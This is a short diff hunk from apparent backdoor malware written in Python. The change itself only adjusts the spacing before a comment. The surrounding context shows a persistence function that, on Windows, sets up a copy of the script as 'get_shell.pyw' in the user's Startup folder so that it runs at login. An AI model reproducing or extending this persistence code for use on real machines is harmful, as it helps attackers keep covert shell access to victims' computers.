@@ -110,7 +110,7 @@ class Backdoor:
 
 def persistence():
 	if os.name == 'nt':
-		script_path = os.path.abspath(sys.argv[0])  #script_path = "C:\\Users\\$PATH\\get_shell.py"
+		script_path = os.path.abspath(sys.argv[0])   #script_path = "C:\\Users\\$PATH\\get_shell.py"
 		startup_dir = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
 		startup_file = os.path.join(startup_dir, "get_shell.pyw")
 
